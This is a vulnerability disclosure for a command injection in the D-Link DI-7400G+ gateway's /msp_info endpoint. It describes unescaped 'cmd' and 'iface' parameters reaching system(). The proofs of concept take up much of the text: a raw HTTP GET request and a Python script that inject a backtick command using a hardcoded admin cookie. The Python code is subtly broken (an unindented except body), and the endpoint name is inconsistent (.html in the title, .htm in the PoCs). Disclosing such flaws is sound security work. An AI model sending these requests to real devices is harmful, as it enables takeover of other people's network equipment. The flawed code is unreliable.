# Information

# D-Link DI-7400G+ Gateway /msp_info.html Path Arbitrary Command Execution Vulnerability

**Vendor of the products:**  D-Link

**Vendor's website:** https://www.dlink.com.cn/

**Affected products:**  DI-7400G+

**Affected products infomation:** https://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-7400G%2B

**Affected firmware version:** V19.12.25A1

**Firmware download address:** [D-Link Technical Support](https://www.dlink.com.cn/techsupport/download.ashx?file=7773)

**Submitter:** Yun Zhang (@DavCloudz)


# Overview

D-Link DI-7400G+ Smart & Simple Series enterprise gateways contain an arbitrary OS command execution vulnerability via the /msp_info.html path. An attacker can exploit this vulnerability by crafting a malicious HTTP GET request to the /msp_info.html endpoint, resulting in arbitrary command execution on the device.

# Vulnerability details

The code snippet that triggers the vulnerability.

<img width="865" height="389" alt="image" src="https://github.com/user-attachments/assets/38cc2830-d8d8-4bb9-a98a-d676d905f63e" />

The parameters retrieved by pcVar2 = httpd_get_parm((int)param_1, \"cmd\") and pcVar3 = httpd_get_parm((int)param_1, \"iface\") are not validated or escaped; they are later used with sprintf() and passed to system(), leading to a command injection vulnerability.

<img width="865" height="407" alt="image" src="https://github.com/user-attachments/assets/6b086b03-0f3e-43dc-88d3-308c657e4113" />

<img width="775" height="166" alt="image" src="https://github.com/user-attachments/assets/158a3ad6-d288-4416-a072-3a92c21b5993" />

<img width="846" height="403" alt="image" src="https://github.com/user-attachments/assets/a230da13-0383-43de-9ec2-fda18a42143d" />


# POC1

```
GET /msp_info.htm?flag=cmd&cmd=`echo%20pwn2own>pwn.txt` HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.0.1/index.htm?_1546272359
Cookie: wysLanguage=CN; userid=admin; gw_userid=admin,gw_passwd=F499CB5B7A1156B90910F2EE55A10A98
Priority: u=0

```

# POC2
```
#!/usr/bin/env python3
import requests
from urllib.parse import quote_plus

base = "http://192.168.0.1/msp_info.htm"

payload_raw = "`echo pwn2own>pwn.txt`"
# URL-encode the payload for safe transmission
payload_enc = quote_plus(payload_raw)

params = {
    "flag": "cmd",
    "cmd": payload_raw  # requests will encode params, quote_plus shown above if you want manual control
}

headers = {
    "Host": "192.168.0.1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Referer": "http://192.168.0.1/index.htm?_1546272359",
    "Cookie": "wysLanguage=CN; userid=admin; gw_userid=admin,gw_passwd=F499CB5B7A1156B90910F2EE55A10A98",
    # Priority header is optional and rarely required by requests
}

try:
    r = requests.get(base, params=params, headers=headers, timeout=10, verify=False)
    print("Request URL:", r.request.url)
    print("Status:", r.status_code)
    print("Response length:", len(r.content))
    print("Response snippet:\n", r.text[:1000])
except Exception as e:
print("Request failed:", e)

```

The malicious GET payload was successfully submitted via Burpsuite.

<img width="865" height="391" alt="image" src="https://github.com/user-attachments/assets/a2404701-2d88-40b0-88d0-4da66f38f39f" />

Execution of the payload enables arbitrary system command injection with full control, thereby compromising the system.

<img width="865" height="119" alt="image" src="https://github.com/user-attachments/assets/2661018e-3470-42fb-bc61-6997d7f557c9" />



